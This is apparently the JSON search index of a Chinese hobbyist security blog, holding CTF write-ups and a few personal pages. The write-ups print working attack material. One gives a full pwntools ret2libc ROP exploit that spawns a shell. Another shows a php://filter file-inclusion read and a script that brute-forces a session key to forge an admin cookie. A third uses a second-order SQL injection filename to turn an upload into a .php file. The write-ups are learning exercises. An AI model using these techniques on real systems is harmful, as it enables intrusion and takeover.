{"pages":[{"title":"404","text":"","path":"404/index.html","date":"09-09","excerpt":""},{"title":"about","text":"死肥宅 真恶心","path":"about/index.html","date":"09-09","excerpt":""},{"title":"藏着一些小秘密。。","text":"看看大哥收藏的 Web 安全Web-Security-Learning PWN 爷爷PWNABLEropemporium &gt;&gt; 一系列 ROP 题目Linux 系统函数大全一步一步学ROP之linux_x86篇 好好打 CTF 吧ctf-all-in-onectf-wiki &lt;&lt; 和上面这个一起食用 平台 CTF TIMES &lt;&lt; 很不错的平台Jarvis OJ实验吧bug kui 春秋php-security-calendar-2017","path":"collections/index.html","date":"09-11","excerpt":""},{"title":"Thu Sep 20 2018 01:40:10 GMT+0800 (中国标准时间)","text":"2018-09-20 01:40:10 建这个是为了写点什么，但是建完之后又不知道写什么了。。。。写感想又怕太矫情，算了留着之后看看想写什么吧。","path":"essays/index - 副本 - 副本 (2).html","date":"09-20","excerpt":""},{"title":"Thu Sep 20 2018 01:40:10 GMT+0800 (中国标准时间)","text":"2018-09-20 01:40:10 建这个是为了写点什么，但是建完之后又不知道写什么了。。。。写感想又怕太矫情，算了留着之后看看想写什么吧。","path":"essays/index - 副本 - 副本.html","date":"09-20","excerpt":""},{"title":"Thu Sep 20 2018 01:40:10 GMT+0800 (中国标准时间)","text":"2018-09-20 01:40:10 建这个是为了写点什么，但是建完之后又不知道写什么了。。。。写感想又怕太矫情，算了留着之后看看想写什么吧。","path":"essays/index - 副本.html","date":"09-20","excerpt":""},{"title":"plan","text":"","path":"plan/index-1.html","date":"09-20","excerpt":""},{"title":"plan","text":"","path":"plan/index-2.html","date":"09-20","excerpt":""},{"title":"不知道什么时候能提上日程的近期计划 👇","text":"2019-09-20 把 PWN 入门早点结束吧（求你了） 每周学习一个 Web 安全 读完码农翻身 读完程序员的自我修养","path":"plan/index.html","date":"09-20","excerpt":""},{"title":"search","text":"","path":"search/index.html","date":"09-09","excerpt":""},{"title":"surprised","text":"heheh :)","path":"surprised/index.html","date":"09-09","excerpt":""}],"posts":[{"title":"一道简单的 PWN 题","text":"这道貌似是 ISG 2015 年的题了。。 本题WP 问题： 跟着栈溢出，将 EIP 覆盖成 write 函数的 plt 值，紧接着 read 的 plt 值，这里让我不解的是： 为什么 read 的函数被执行了。猜测应该是 write 函数中自带了 ret 指令。明天争取学会用 gdb 调试进 write 函数中吧。 接上。。尝试用 gdb 进入 write 函数。但是： 问了表哥后，表哥来了个姿势：先运行，在输入的时候按 CTRL+C （之前确实没学过 gdb ） 但是这里，可以整个更直接的：b write 运行&gt; 进入到 write 函数内，首先看看怎么取参数： 等会再讲。。 再看看最后，发现确实用的 ret（废话，不用 ret 怎么返回） 切入这道题。。。 思考 首先丢进 ida 里看看 很明显的一个缓冲区溢出。。（我也只会缓冲区溢出了） 这里写的 变量 v1 离 ebp 为 0xC(12) 个位置，但是实际测试为 0x10(16) 个位置。 这里玩个好玩的。。我们可以用 gdb_pattern 生成一些字符串，发送出去后查看 EIP。将此时的 EIP 记录下来再用 gdb_offset 查看偏移位置，这就是变量离 EIP 的位置了： 现在我们知道是离 20 个位置。我们可以先溢出玩玩，这里 checksec 发现开启了 NX 。我们可以先用 write 函数试试水。比如就打印 ida 代码中 第 6 行的 write(1, &quot;Welcome to ISG 2015!\\nPwn me to get the flag:\\n&quot;, 0x2Du); 在 ida 中看看 plt 的 write 地址： 再在 qira 中看看 welcome to isg.. 这段字符串在哪： 因为之前调用的 write 函数就是输出这段字符串，所以这个地址就是那段字符串的地址咯。。 整理一下： 初始栈的结构： 相对地址 对应值 0x0 变量 v1 0x4 … 0x8 … 0x12 … 0x16 ESP 0x20 EIP 所以这里填充 20 位任意字符。再用 write 函数的 plt 地址覆盖 EIP。 POC 如下： 看看 qira 中： 看到 write 函数执行了，但是我们没给参数，所以他取到了栈里的默认值，而中间的参数是最明显的，所以我们看看中间的参数位置是多少，方便覆盖。位置是：0xf6fff018 ，此时栈顶的地址： 0xf6fff008 。 回到一开始。。在 write 函数的截图中，发现取得参数位置分别是：esp+0x8, esp+0xC,esp+0x10。在取参数之前还有个 push 操作（在 write 函数中，上面的截图有。。），所以取参数得实际位置 +4。所以分别为： esp+0x8，esp+0x10,esp+14 。 再看个明显点的例子： 这里尝试控制参数。。 简单的加法：0x8+0x14 = 0x1C 函数调用 ok，别忘了一开始要做的事情，就是再调用一次 write 函数，输出一次 Welcome... 那个字符串。 找基地址 我们可以直接去 GOT 表找 write 函数的地址： 在 GOT 表中找到了 write 函数：0x804a01c。 改一下 ROP 链，将 write 的实际函数地址打印出来： 可以看到输出了正确的地址。代码中上面的 r.recv 是用来接收一开始输出的那段 welcome...，但是没必要输出（ 不接收的话下面 recv 还是会先接收到这个字符串 ）。 获取 system 地址和 /bin/sh 字符串 通过 ldd 看看这个 二进制 文件用了什么链接库.. 1234root@nick-machine:/home/nick/liey# ldd pwnme linux-gate.so.1 =&gt; (0xf77bc000) libc.so.6 =&gt; /lib32/libc.so.6 (0xf75f4000) /lib/ld-linux.so.2 (0x565e8000) /lib32/libc.so.6 中有我们想要的，首先是 获取 write 函数的偏移地址，这样就能获取到基地址了，可以用 readelf： 123root@nick-machine:/home/nick/liey# readelf -a /lib32/libc.so.6|grep write@ ..... 2303: 000d9900 119 FUNC WEAK DEFAULT 12 write@@GLIBC_2.0 记下来，偏移地址 0xd9900。 接下是 system 函数偏移地址： 123root@nick-machine:/home/nick/liey# readelf -a /lib32/libc.so.6|grep system@ ... 1443: 0003fe70 56 FUNC WEAK DEFAULT 12 system@@GLIBC_2.0 system 偏移地址是 0x3fe70。。接下来是 /bin/sh ，这个字符串用来传进 system 函数以便获取 shell，这里我们用 ROPgadget 1234root@nick-machine:/home/nick/liey# ROPgadget --binary /lib32/libc.so.6 --string &quot;/bin/sh&quot;Strings information============================================================0x0015da8c : /bin/sh 再发送 接下来思考一个问题，就是纵使在发送完一次 shellcode 只会知道了 基地址。但是我们却不能再调用了。。。 在最前面提到过。write 函数会调用 ret。可以把这个理解成 pop eip。也就是在栈顶中取出 eip。。。那么栈顶是哪呢？ 就是在 write 后以及所有参数的最前面。前面我用 0x61616161 替代了。。 但是又会遇到一个问题。。就是即使直接调用了 system 函数，函数内取参数是取的 esp+0x8，但是 esp+0x8 这个位置被 write 函数的 0xC 占用了。。 想一下是那个函数写进这段 shellcode 的。对，main 函数，我们可以调用会 main 函数，再调用一次 shellcode，只不过这次是调用 system 函数，而不是 write 函数。 (main 函数的位置再 ida 中可以找到) 完整的POC： 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *r = remote(&quot;192.168.1.107&quot;,4000)write_plt=0x08048370main=0x804847dprint(r.recv())poc_rop1=[ write_plt, main, 0x1, 0x804a01c, 4,]shellcode=&quot;a&quot;*20 + flat(poc_rop1)r.sendline(shellcode)write_offset = 0xd9900system_offset =0x3fe70bin_bash = 0x0015da8cbase = p32(int(r.recv().encode(&apos;hex&apos;),16)).encode(&apos;hex&apos;)base=int(base,16)-write_offsetsystem = base + system_offsetbin_str = base + bin_bashpoc_rop2 = [ system, 0x61626364, bin_str,]shellcode2 = &quot;a&quot;*12 + flat(poc_rop2)r.sendline(shellcode2)r.interactive() 需要注意的是第二次只需要填充 12 个 字符即可。。 效果： Done….","path":"2018/09/11/一道简单的 PWN 题/","date":"09-11","excerpt":""},{"title":"蓝鲸笔记管理系统（塔主nb）","text":"蓝鲸官网本题源码 首先先随便注册个，登陆看看： 这里看到个提示一样的东西：访问 /dbinit.sql 拿到 数据库结构。 再看看地址，首页的 url 地址为：http://106.39.10.134:10002/index.php?action=front&amp;mode=index 一开始还以为是 MVC 架构的，后来看了师傅的 WP 发现： 123456&lt;?php$action=$_GET['action'];$mode=$_GET['mode'];$file=$action.'/'.$mode.'.php';include($file);?&gt; 很明显的一个文件包含漏洞。用 php://filter 伪协议读取源码： /index.php?action=php://filter/read=convert.base64-encode/resource=front/&amp;mode=index 但是这里读不出 config.inc.php 原因可以在 index.php 中看到： 1else if(!preg_match(&apos;/\\.&#123;2&#125;/is&apos;,$_GET[&apos;action&apos;])&amp;&amp;preg_match(&apos;/^[0-9A-Za-z]+$/is&apos;,$_GET[&apos;mode&apos;]) mode 中不能包含 . 共读取到：123456789index.phpcommon.phpadmin/index.phpadmin/login.phpadmin/setpagenum.phpfront/index.phpfront/login.phpfront/newnote.phpfront/register.php 我们可以看看 admin/index.php 中是怎么验证是否登陆的（别问为什么一上来就看这个）： 调用了 check_login 和 get_level 函数，这两个函数在 common.php 中。我们先看看这个文件的开头： 很明显，这里进行了一些初始化操作。 再来看看两个验证函数： 这里将 cookie 中的 uid 取出，以 | 分割，加密判断。 如果成功返回当前 $_SESSION 中的值，否则返回 False。如果没登陆，那此时的值为 NULL ，但是判断使用的是 严格 判断，即： 1if(check_login()!==false&amp;&amp;get_level()!==false) 这两个函数的绕过方法是一样的，所以下一步我们的目标就是研究： $userinfo[1]==encode($userinfo[0]) 这个条件怎么成立，这个数组是我们可控的，我们可以跟进 encode 函数中： 123function encode($str)&#123; return md5($_SESSION['SECURITY_KEY'].$str);&#125; 不难理解，翻上面发现： 1$_SESSION[&apos;SECURITY_KEY&apos;]=rand_str(6); 来看看这个函数的实现：1234567891011function rand_str($lenth=16)&#123; $rand=[]; $_str=\"wh\"; while($lenth)&#123; $rand[]=$_str[rand(0,strlen($_str)-1)]; $lenth--; &#125;// var_dump($rand); return implode($rand);&#125; 随机取6位 w 或 h 整理一下思路： 要想绕过登陆验证，就要让验证函数返回 NULL。 函数返回 NULL 的条件为： 1if($userinfo[1]==encode($userinfo[0])) $userinfo 是我们可以控制的，唯一不确定的是 encode 函数中用到的 $_SESSION[&#39;SECURITY_KEY&#39;] 因为不对，所以我们写个脚本爆破： 1234567891011121314151617181920import requestsimport itertoolsfrom hashlib import md5lst = itertools.product(&quot;wh&quot;, repeat=6)url = &quot;http://106.39.10.134:10002/index.php?action=admin&amp;mode=index&quot;def m(s): return md5(s).hexdigest()for i in lst: key = m(&apos;&apos;.join(i) + &apos;admin&apos;) headers = &#123; &quot;Cookie&quot;: &quot;PHPSESSID=05ibpb1gtgmuq4ji4g5cgkvg07;uid=admin|&quot; + key &#125; r = requests.get(url, headers=headers) if r.text.find(&quot;not login&quot;) &lt; 0: print(headers) 很快就会输出 Cookie，添加上浏览器，再访问 后台的 index 即可。。 踩坑 这里还有个坑，就是如果你当前的 SESSION 已经登陆过前台，那么爆破就会失败。原因可能是 $_SESSION 中登陆的用户的 level 为 0，在 get_level 函数中会返回 False 现在我们已经登陆了后台，看看后台的代码： 这里拼接了个 get_page_size()，这个函数在 common.php 里，我们看看这个函数： 123456function get_page_size()&#123; $sql=&quot;select num from page&quot;; $res=mysql_my_query($sql); $row=$res-&gt;fetch_assoc(); return $row[&apos;num&apos;];&#125; 只做了很简单的查询。 我们会发现后台页面还有个设置页面（setpagenum.php），进去看看： 这个设置就是 get_page_size 查询并返回的表和字段，猜测关键点可能就在这了（别问为什么猜）。 可以看到，这里做了 is_numeric 的判断，判断是否是数字。 mysql 中允许这么玩：select 0x313233; 这条语句会输出 123，也就是 ASCII 码。 但是不允许这么玩： select &#39;0x313233&#39;; 注意这里加了单引号，此时输出 0x313133 我们发现这里是没有加引号的，所以我们传进来的值会在执行时解析成 ASCII 码。如果这是故意留的洞，那该字段的属性就不会是 int。因为 int 就不能存储字符串了。 回顾一下查询语句： 12$page_size=get_page_size();$sql=&quot;select * from note limit 0,&quot;.$page_size; 思考能不能用这样的语句：select * from note limit 0,1 union select 2 （！！！ 5.7 以后 limit 必须要放在最后，5.7以前是可以的） 5.7 以后会报：ERROR 1221 (HY000): Incorrect usage of UNION and LIMIT 利用 那么现在就可以利用了： 在 mysql 里运行： 这样我们就可以很方便的获得 16进制 了（只要转成 ASCII 就可以了）。 加上 0x 填上去提交： 到前台： 可以看到 3 和 2 被显示出来了。。看回一开始拿到的数据库结构，发现有个flags 表和 flag 字段，构造一下就可以出来了。。 突然的结束，是因为懒","path":"2018/09/09/蓝鲸笔记管理系统/","date":"09-09","excerpt":""},{"title":"蓝鲸文件管理系统（塔主nb）","text":"蓝鲸官网本题源码 题目描述： 1蓝鲸为了整理自己的工具，开发了一个文件管理系统，本来对系统的功能很满意，可是为什么总有人把蓝鲸的文件名修改了？蓝鲸找到了机智的你帮助它审计代码~ 这题一开始直接给了源码。 首先先看看上传的代码（uplaod.php）： 这里两个关键点： 121. 限制了文件的后缀名2. 插入进数据库 首先想想能不能这样： 这样是不行得。。因为在下面的拼接文件名的时候用的也是这个后缀：1$name = $path_parts[\"filename\"] . $path_parts[\"extension\"]; //此为上传的文件名 根据题目描述，我们看看 rename.php： 这里的 $req 在 common.inc.php 中是这么定义的： 12345foreach(array($_GET, $_POST, $_COOKIE) as $global_var) &#123; foreach($global_var as $key =&gt; $value) &#123; is_string($value) &amp;&amp; $req[$key] = addslashes($value); &#125;&#125; 类似自动解析了吧。 采坑 假设我们上传的文件名为：test.jpg 这无论如何都会在新文件名后加上 $result[&#39;extension&#39;] 在这里起初想绕过 rename ，即类似 move_uploaded_file 函数一样，传入 windows 文件名中不允许的字符，类似：newname.php.php;.jpg 或者 newname.php.php/.jpg(两个 .php 是因为在第22行会对$newname进行一次 basename操作) 但是貌似 rename 函数会报错（总之就是不行，原谅我看不懂内核代码） 放弃这个想法，看了师傅的 WP 后发现： 关键点在 23行的 update 语句： 1update `file` set `filename`=&apos;&#123;$req[&apos;newname&apos;]&#125;&apos;, `oldname`=&apos;&#123;$result[&apos;filename&apos;]&#125;&apos; where `fid`=&#123;$result[&apos;fid&apos;]&#125; $result 是在 第13行 根据传入的文件名查询出来的。 这里把 oldname 字段设置成了 $result[&#39;filename&#39;]。 这里的 $result[‘filename’] 我们是可控的，且没有做任何过滤。虽然传入的时候经过了 addslashes 的过滤（在 common.inc.php 中），但是查询出来后却没有过滤。 可控有什么用呢？前面分析过这里最大的问题在改的新名字会被强制加上 $result[&#39;extension&#39;]。但是这里是可以注入的，所以只要我们的文件名够骚，我们就能操作 update 语句，我们就可以将 extension 字段覆盖为空。 比如：&#39;,extension=&#39;&#39;,filename=&#39;test.jpg（最后要为 .jpg ） 此时数据库和文件夹里的情况： 此时去改名，传入文件名：&#39;,extension=&#39;&#39;,filename=&#39;test(去掉后缀)新文件名传入：test 此时的sql语句：1sql：update `file` set `filename`=&apos;test&apos;, `oldname`=&apos;&apos;,extension=&apos;&apos;,filename=&apos;test&apos; where `fid`=2 再看看： ok，成功踩坑。此时发现数据中的 filename 和 文件夹中的不同。下次 rename 的时候会找不到 test 文件（此时数据库中的 extension 已经为空） last我们把上传的文件名改改：&#39;,extension=&#39;&#39;,filename=&#39;test.jpg.jpg 此时的语句：1update `file` set `filename`=&apos;test&apos;, `oldname`=&apos;&apos;,extension=&apos;&apos;,filename=&apos;test.jpg&apos; where `fid`=3 会发现把 filename 设置成了 test.jpg 了，此时数据库与文件夹一致（不想截图了。。） 再改次名：12oldname：test.jpgnewname：test.php 即可。","path":"2018/09/09/蓝鲸文件管理系统/","date":"09-09","excerpt":""},{"title":"Nothing。。。","text":":)","path":"2018/09/09/hello-world/","date":"09-09","excerpt":""}]}